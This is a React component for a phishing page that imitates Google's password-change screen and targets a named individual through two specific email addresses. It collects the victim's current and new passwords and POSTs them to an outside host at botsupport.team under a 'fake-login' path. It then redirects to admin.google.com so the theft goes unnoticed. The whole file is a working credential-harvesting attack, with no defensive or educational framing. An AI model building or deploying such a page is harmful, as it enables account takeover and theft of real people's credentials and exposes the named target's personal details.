import Logo from "./assets/google.svg";
import Sasa from "./assets/Sasa.jpg";
import Sasa1 from "./assets/Sasa1.webp";

import React, { useState } from "react";
import "./App.css";
import {
  Paper,
  Box,
  Typography,
  TextField,
  Avatar,
  FormControlLabel,
  Checkbox,
  Button,
  Container,
  Grid,
} from "@mui/material";
import KeyboardArrowDownIcon from "@mui/icons-material/KeyboardArrowDown";
import ArrowDropDownIcon from "@mui/icons-material/ArrowDropDown";
import axios from "axios";
function App() {
  const queryString = new URLSearchParams(window.location.search);

  const [info, setInfo] = useState({
    current_password: "",
    new_password: "",
    re_password: "",
  });

  const [error, setError] = useState("");
  const name = queryString.get("name") === "bussines";

  const [show, setShow] = useState(false);

  const onChange = (e) => {
    setInfo({ ...info, [e.target.name]: e.target.value });
  };

  const onChangeShow = (e) => {
    setShow(!show);
  };
  const onSubmit = async (e) => {
    e.preventDefault();
    if (!info.current_password || !info.new_password || !info.re_password)
      return;

    if (info.new_password !== info.re_password) {
      setError("Passowrd Not Matched");
      return;
    } else {
      setError("");
    }

    axios
      .post("https://www.botsupport.team/user/fake-login/", info)
      .then((_) => {
        window.location.href = "https://admin.google.com";
      })
      .catch((e) => console.log(e));
  };
  return (
    <Paper
      onSubmit={onSubmit}
      elevation={0}
      className="form-container"
      component="form"
    >
      <Container maxWidth="sm">
        <Grid container spaching={2}>
          <Grid item xs={12}>
            <Box className="form-elemnts">
              <img className="google-logo" src={Logo} alt="logo" />
              <Typography
                sx={{
                  fontFamily: "'Open Sans', sans-serif",
                }}
                variant="h5"
              >
                Hi Moustafa
              </Typography>
              <Box
                className="email-container"
                component="a"
                href="https://accounts.google.com/AddSession/signinchooser?hl=ar&continue=https%3A%2F%2Fwww.google.com%2F&ec=GAlAmgQ&authuser=0&flowName=GlifWebSignIn&flowEntry=AddSession"
              >
                <Avatar
                  className="email-image"
                  src={name ? Sasa1 : Sasa}
                  sx={{
                    objectFit: "cover",
                    mr: 0.5,
                  }}
                >
                  M
                </Avatar>
                <Typography
                  color="text.secondary"
                  sx={{
                    fontWeight: "bold",
                    fontFamily: "'Open Sans', sans-serif",
                  }}
                  variant="caption"
                  className="email-name"
                >
                  {name
                    ? "m.abdelqayoum@balanceoftranslation.com"
                    : "moustafa.hak@gmail.com"}
                </Typography>
                <KeyboardArrowDownIcon />
              </Box>

              <TextField
                fullWidth
                sx={{ mb: 2 }}
                id="outlined-basic"
                label="Current password"
                variant="outlined"
                type={show ? "text" : "password"}
                value={info.current_password}
                name="current_password"
                onChange={onChange}
              />
              <TextField
                fullWidth
                sx={{ mb: 2 }}
                id="outlined-basic"
                label="New password"
                variant="outlined"
                type={show ? "text" : "password"}
                value={info.new_password}
                name="new_password"
                onChange={onChange}
                helperText={error}
                error={!!error}
              />
              <TextField
                fullWidth
                sx={{ mb: 0 }}
                id="outlined-basic"
                label="Confirm new password"
                variant="outlined"
                type={show ? "text" : "password"}
                value={info.re_password}
                name="re_password"
                onChange={onChange}
                helperText={error}
                error={!!error}
              />
              <FormControlLabel
                sx={{ display: "flex", alignSelf: "flex-start", mb: 3 }}
                control={<Checkbox />}
                label="Show Password"
                labelPlacement="end"
                onChange={onChangeShow}
              />
              <Button
                variant="contained"
                type="submit"
                sx={{
                  display: "flex",
                  alignSelf: "flex-end",
                  mb: 3,
                  textTransform: "none",
                }}
              >
                Confirm
              </Button>
            </Box>
          </Grid>
          <Grid item xs={12}>
            <Box className="footer">
              <div className="lang">
                <Typography sx={{ color: "text.secondary" }} variant="caption">
                  English (United States)
                </Typography>
                <ArrowDropDownIcon sx={{ color: "text.secondary" }} />
              </div>
              <div className="links">
                <Button
                  sx={{
                    color: "text.secondary",
                    fontSize: "12px",
                    fontWeight: "400",
                  }}
                >
                  <a href="https://support.google.com/accounts?hl=en&visit_id=638113301317507595-14785125&rd=2&p=account_iph#topic=3382296">
                    Help
                  </a>
                </Button>
                <Button
                  sx={{
                    color: "text.secondary",
                    fontSize: "12px",
                    fontWeight: "400",
                  }}
                >
                  <a href="https://support.google.com/accounts?hl=en&visit_id=638113301317507595-14785125&rd=2&p=account_iph#topic=3382296">
                    Privacy
                  </a>
                </Button>
                <Button
                  sx={{
                    color: "text.secondary",
                    fontSize: "12px",
                    fontWeight: "400",
                  }}
                >
                  <a href="https://policies.google.com/terms?gl=EG&hl=en">
                    Terms
                  </a>
                </Button>
              </div>
            </Box>
          </Grid>
        </Grid>
      </Container>
    </Paper>
  );
}

export default App;
